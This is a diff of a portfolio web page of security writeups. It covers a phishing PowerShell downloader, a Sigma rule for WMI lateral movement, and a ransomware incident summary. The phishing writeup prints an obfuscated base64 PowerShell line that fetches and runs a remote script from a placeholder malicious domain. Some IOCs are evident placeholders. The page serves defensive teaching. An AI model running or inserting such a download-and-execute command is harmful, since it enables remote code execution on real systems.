@@ -1,45 +1,478 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Technical Writeups – Swetha Devi</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <style>
-        body { background: #0a0e27; color: #fff; font-family: Segoe UI; margin:0; padding:40px; }
-        h1 { color:#00d9ff; text-align:center; margin-bottom:20px; }
-        .card { background:#151932; padding:25px; border-radius:12px; margin-bottom:20px;
-                border:1px solid #2d3748; }
-        .card:hover { border-color:#00d9ff; box-shadow:0 8px 25px rgba(0,217,255,0.2); }
-        h2 { color:#00d9ff; }
-        a { color:#00d9ff; }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Security Writeups - Swetha Devi</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+  
+  <style>
+    :root{
+      --bg:#0a0e27; 
+      --card:#14182e; 
+      --muted:#8b95a5; 
+      --accent:#00d9ff; 
+      --accent-2:#00a896;
+      --text:#e8eef6;
+      --border:rgba(255,255,255,0.06);
+    }
+    
+    *{box-sizing:border-box; margin:0; padding:0}
+    
+    body{
+      font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background:var(--bg);
+      color:var(--text);
+      line-height:1.7;
+      -webkit-font-smoothing:antialiased;
+      padding: 20px;
+    }
+    
+    .container{
+      max-width:1000px;
+      margin:0 auto;
+    }
+    
+    .back-link{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      color:var(--accent);
+      text-decoration:none;
+      margin-bottom:40px;
+      padding:10px 0;
+    }
+    
+    .writeup-header{
+      margin-bottom:40px;
+    }
+    
+    .writeup-header h1{
+      font-size:36px;
+      margin-bottom:16px;
+    }
+    
+    .writeup-meta{
+      color:var(--muted);
+      font-size:15px;
+      display:flex;
+      gap:20px;
+      margin-bottom:20px;
+    }
+    
+    .writeup-tags{
+      display:flex;
+      gap:10px;
+      flex-wrap:wrap;
+    }
+    
+    .tag{
+      background:rgba(0,217,255,0.1);
+      border:1px solid rgba(0,217,255,0.2);
+      padding:6px 12px;
+      border-radius:20px;
+      font-size:13px;
+      color:var(--accent);
+    }
+    
+    .writeup-content{
+      background:var(--card);
+      border:1px solid var(--border);
+      border-radius:16px;
+      padding:40px;
+      margin-bottom:60px;
+    }
+    
+    .writeup-content h2{
+      color:var(--accent);
+      margin:30px 0 15px;
+      font-size:24px;
+    }
+    
+    .writeup-content h3{
+      color:var(--text);
+      margin:25px 0 12px;
+      font-size:20px;
+    }
+    
+    .writeup-content p{
+      margin-bottom:16px;
+      color:var(--muted);
+    }
+    
+    .writeup-content ul, .writeup-content ol{
+      margin:16px 0 16px 20px;
+      color:var(--muted);
+    }
+    
+    .code-block{
+      margin:20px 0;
+      background:rgba(0,0,0,0.3);
+      border-radius:12px;
+      overflow:hidden;
+      border:1px solid var(--border);
+    }
+    
+    .code-header{
+      padding:12px 20px;
+      background:rgba(0,0,0,0.4);
+      border-bottom:1px solid var(--border);
+      font-size:14px;
+      color:var(--muted);
+    }
+    
+    pre{
+      margin:0;
+      padding:20px;
+      overflow-x:auto;
+    }
+    
+    .ioc-box{
+      background:rgba(255,0,0,0.05);
+      border:1px solid rgba(255,0,0,0.2);
+      border-radius:8px;
+      padding:20px;
+      margin:20px 0;
+    }
+    
+    .ioc-box h4{
+      color:#ff6b6b;
+      margin-bottom:10px;
+    }
+    
+    @media (max-width: 768px){
+      .writeup-header h1{
+        font-size:28px;
+      }
+      .writeup-content{
+        padding:24px;
+      }
+    }
+  </style>
 </head>
-
 <body>
+  <div class="container">
+    <a href="index.html" class="back-link">
+      <i class="fas fa-arrow-left"></i> Back to Home
+    </a>
+    
+    <!-- Writeup Template (Hidden) -->
+    <article class="writeup" id="writeup-template" style="display: none;">
+      <div class="writeup-header">
+        <h1>Writeup Title</h1>
+        <div class="writeup-meta">
+          <span class="date">Date • Read Time</span>
+        </div>
+        <div class="writeup-tags">
+          <!-- Tags will be added here -->
+        </div>
+      </div>
+      
+      <div class="writeup-content">
+        <!-- Content will be added here -->
+      </div>
+    </article>
+    
+    <!-- Individual Writeups will be loaded here -->
+    <div id="writeups-list"></div>
+  </div>
 
-<h1>📘 Technical Writeups</h1>
+  <script>
+    // Writeups Data - All writeups stored here
+    const writeupsData = [
+      {
+        id: "phishing-powershell",
+        title: "Phishing Campaign Analysis: PowerShell Downloader",
+        date: "Jan 15, 2024",
+        readTime: "8 min read",
+        tags: ["phishing", "powershell", "c2", "download", "analysis"],
+        content: `
+          <h2>Overview</h2>
+          <p>Analysis of a sophisticated phishing campaign using PowerShell downloaders to establish command and control infrastructure.</p>
+          
+          <h2>Attack Chain</h2>
+          <ol>
+            <li>Phishing email with malicious Word document attachment</li>
+            <li>Macro execution triggering PowerShell script</li>
+            <li>Base64 encoded downloader execution</li>
+            <li>C2 communication establishment</li>
+            <li>Secondary payload delivery and execution</li>
+          </ol>
+          
+          <h2>PowerShell Analysis</h2>
+          <p>The malicious PowerShell script uses multiple obfuscation techniques:</p>
+          
+          <div class="code-block">
+            <div class="code-header">powershell</div>
+            <pre><code class="language-powershell"># Base64 encoded PowerShell downloader
+$enc = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBkAG8AbQBhAGkAbgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
+$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))
+Invoke-Expression $dec</code></pre>
+          </div>
+          
+          <h2>Indicators of Compromise (IOCs)</h2>
+          <div class="ioc-box">
+            <h4>Network IOCs</h4>
+            <p>• malicious-domain.com</p>
+            <p>• 192.168.1.100</p>
+            <p>• hxxp://evil[.]com/payload.exe</p>
+          </div>
+          
+          <div class="ioc-box">
+            <h4>File Hashes</h4>
+            <p>• MD5: a1b2c3d4e5f678901234567890123456</p>
+            <p>• SHA256: abc123def45678901234567890abcdef1234567890abcdef1234567890abcd</p>
+          </div>
+          
+          <h2>Detection Recommendations</h2>
+          <p>Create detection rules for:</p>
+          <ul>
+            <li>Base64 encoded PowerShell execution</li>
+            <li>Suspicious network connections from PowerShell processes</li>
+            <li>Unusual process chains involving Office applications and PowerShell</li>
+            <li>Large Base64 strings in command line arguments</li>
+          </ul>
+          
+          <h2>Mitigation Steps</h2>
+          <ol>
+            <li>Disable Office macros by default</li>
+            <li>Implement application whitelisting</li>
+            <li>Monitor PowerShell execution logs</li>
+            <li>Regular user awareness training</li>
+          </ol>
+        `
+      },
+      {
+        id: "wmi-lateral",
+        title: "WMI Abuse for Lateral Movement Detection",
+        date: "Jan 16, 2024",
+        readTime: "6 min read",
+        tags: ["lateral", "wmi", "detection", "windows", "movement"],
+        content: `
+          <h2>Introduction</h2>
+          <p>Windows Management Instrumentation (WMI) is frequently abused by attackers for lateral movement. This writeup details detection methods for WMI-based attacks.</p>
+          
+          <h2>Common WMI Attack Patterns</h2>
+          <p>Attackers typically abuse these WMI classes:</p>
+          <ul>
+            <li><strong>Win32_Process</strong> - For remote process creation</li>
+            <li><strong>Win32_Service</strong> - For service manipulation and persistence</li>
+            <li><strong>Win32_ScheduledJob</strong> - For scheduled task creation</li>
+            <li><strong>StdRegProv</strong> - For registry manipulation</li>
+            <li><strong>Win32_NetworkAdapterConfiguration</strong> - For network configuration changes</li>
+          </ul>
+          
+          <h2>Detection Rule Example</h2>
+          <p>Sigma rule for detecting suspicious WMI activity:</p>
+          
+          <div class="code-block">
+            <div class="code-header">yaml</div>
+            <pre><code class="language-yaml">title: Suspicious WMI Execution for Lateral Movement
+id: 12345678-1234-1234-1234-123456789012
+status: experimental
+description: Detects suspicious WMI process creation often used for lateral movement
+author: Swetha Devi
+date: 2024/01/16
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        ParentImage|endswith: 
+            - '\\WmiPrvSE.exe'
+            - '\\wmiprvse.exe'
+        Image|endswith:
+            - '\\cmd.exe'
+            - '\\powershell.exe'
+            - '\\wmic.exe'
+    condition: selection
+falsepositives:
+    - Legitimate administrative scripts using WMI
+level: high
+tags:
+    - attack.lateral_movement
+    - attack.t1047</code></pre>
+          </div>
+          
+          <h2>Investigation Steps</h2>
+          <ol>
+            <li>Check Windows Event Logs: WMI-Activity/Operational logs</li>
+            <li>Look for suspicious consumer bindings in WMI repository</li>
+            <li>Review process creation events from WmiPrvSE.exe</li>
+            <li>Check for WMI persistence mechanisms and event subscriptions</li>
+            <li>Analyze network connections from compromised systems</li>
+          </ol>
+          
+          <h2>Prevention & Mitigation</h2>
+          <ul>
+            <li>Restrict WMI permissions using Group Policy</li>
+            <li>Monitor WMI event subscriptions regularly</li>
+            <li>Implement network segmentation to limit lateral movement</li>
+            <li>Use endpoint detection and response (EDR) solutions</li>
+            <li>Regularly review and audit WMI activity logs</li>
+          </ul>
+          
+          <h2>Key Detection Points</h2>
+          <p>Monitor for these suspicious activities:</p>
+          <ul>
+            <li>WMI process creation from unusual parent processes</li>
+            <li>High volume of WMI queries in short time periods</li>
+            <li>WMI connections to multiple systems in sequence</li>
+            <li>Creation of WMI event subscriptions for persistence</li>
+          </ul>
+        `
+      },
+      {
+        id: "ransomware-analysis",
+        title: "Ransomware Infection Chain Analysis",
+        date: "Feb 20, 2024",
+        readTime: "10 min read",
+        tags: ["ransomware", "encryption", "analysis", "recovery", "incident-response"],
+        content: `
+          <h2>Executive Summary</h2>
+          <p>Detailed analysis of a ransomware attack affecting multiple systems across the network. The ransomware uses AES-256 encryption with RSA key exchange for file encryption.</p>
+          
+          <h2>Infection Timeline</h2>
+          <p><strong>Day 1:</strong> Initial access via RDP brute force attack</p>
+          <p><strong>Day 2:</strong> Discovery phase using built-in Windows tools</p>
+          <p><strong>Day 3:</strong> Lateral movement via PsExec and WMI</p>
+          <p><strong>Day 4:</strong> Ransomware deployment and execution across network</p>
+          
+          <h2>Technical Analysis</h2>
+          <p>The ransomware exhibits these characteristics:</p>
+          <ul>
+            <li>Disables Windows Defender and other security software</li>
+            <li>Deletes volume shadow copies using vssadmin.exe</li>
+            <li>Encrypts files with .locked extension</li>
+            <li>Drops ransom note (README_DECRYPT.txt) in each directory</li>
+            <li>Uses legitimate Windows binaries for living-off-the-land attacks</li>
+          </ul>
+          
+          <h2>Indicators of Compromise</h2>
+          <div class="ioc-box">
+            <h4>File Extensions</h4>
+            <p>• .locked</p>
+            <p>• .encrypted</p>
+            <p>• .crypted</p>
+          </div>
+          
+          <div class="ioc-box">
+            <h4>Ransom Note Content</h4>
+            <p>• "Your files have been encrypted"</p>
+            <p>• Bitcoin wallet address</p>
+            <p>• Tor payment site URL</p>
+          </div>
+          
+          <h2>Recovery Recommendations</h2>
+          <ol>
+            <li>Immediately isolate affected systems from the network</li>
+            <li>Restore encrypted files from offline backups</li>
+            <li>Reset all domain and local account credentials</li>
+            <li>Conduct thorough post-incident review and analysis</li>
+            <li>Implement additional security controls based on findings</li>
+          </ol>
+          
+          <h2>Prevention Strategies</h2>
+          <ul>
+            <li>Implement multi-factor authentication for RDP</li>
+            <li>Regular offline backups tested for restoration</li>
+            <li>Network segmentation to limit lateral movement</li>
+            <li>Application whitelisting policies</li>
+            <li>Regular security awareness training</li>
+          </ul>
+        `
+      }
+    ];
 
-<div class="card">
-    <h2>🔍 Phishing – PowerShell Downloader Analysis</h2>
-    <p>Base64 encoded PowerShell → C2 communication mapping to MITRE T1059.001, T1105.</p>
-    <a href="#">Read full report →</a>
-</div>
+    // Function to display all writeups on writeups.html
+    function displayAllWriteups() {
+      const container = document.getElementById('writeups-list');
+      
+      if (!container) return;
+      
+      writeupsData.forEach(writeup => {
+        // Create a new writeup element
+        const writeupElement = document.createElement('article');
+        writeupElement.className = 'writeup';
+        writeupElement.id = writeup.id;
+        
+        // Build HTML structure
+        writeupElement.innerHTML = `
+          <div class="writeup-header">
+            <h1>${writeup.title}</h1>
+            <div class="writeup-meta">
+              <span class="date">${writeup.date} • ${writeup.readTime}</span>
+            </div>
+            <div class="writeup-tags">
+              ${writeup.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
+            </div>
+          </div>
+          
+          <div class="writeup-content">
+            ${writeup.content}
+          </div>
+        `;
+        
+        container.appendChild(writeupElement);
+      });
+      
+      // Load Prism for syntax highlighting
+      if (!window.Prism) {
+        const prismScript = document.createElement('script');
+        prismScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js';
+        document.head.appendChild(prismScript);
+        
+        const powershellScript = document.createElement('script');
+        powershellScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js';
+        document.head.appendChild(powershellScript);
+        
+        const yamlScript = document.createElement('script');
+        yamlScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js';
+        document.head.appendChild(yamlScript);
+        
+        // Wait for Prism to load
+        setTimeout(() => {
+          if (window.Prism) {
+            Prism.highlightAll();
+          }
+        }, 500);
+      } else {
+        Prism.highlightAll();
+      }
+    }
 
-<div class="card">
-    <h2>🛑 Lateral Movement via WMI</h2>
-    <p>Detected suspicious WMI process creation from admin workstation using Sysmon IDs 1, 3.</p>
-    <a href="#">Read full report →</a>
-</div>
+    // Function to get preview writeups for index.html
+    function getWriteupPreviews() {
+      // Return first 2 writeups for preview
+      return writeupsData.slice(0, 2).map(writeup => ({
+        ...writeup,
+        preview: writeup.content.replace(/<[^>]*>/g, '').substring(0, 150) + '...'
+      }));
+    }
 
-<div class="card">
-    <h2>🚨 Early-stage Ransomware Detection</h2>
-    <p>Identified abnormal file modifications + shadow copy checks. Stopped before encryption.</p>
-    <a href="#">Read full report →</a>
-</div>
+    // Initialize based on current page
+    if (document.getElementById('writeups-list')) {
+      // We're on writeups.html - display all writeups
+      displayAllWriteups();
+      
+      // Handle hash navigation for deep linking
+      window.addEventListener('load', () => {
+        if (window.location.hash) {
+          const targetId = window.location.hash.substring(1);
+          const target = document.getElementById(targetId);
+          if (target) {
+            setTimeout(() => {
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }, 100);
+          }
+        }
+      });
+    }
 
-<a href="index.html">← Back to Home</a>
-
+    // Make functions available globally for index.html to call
+    window.writeupsData = writeupsData;
+    window.getWriteupPreviews = getWriteupPreviews;
+  </script>
 </body>
 </html>
-
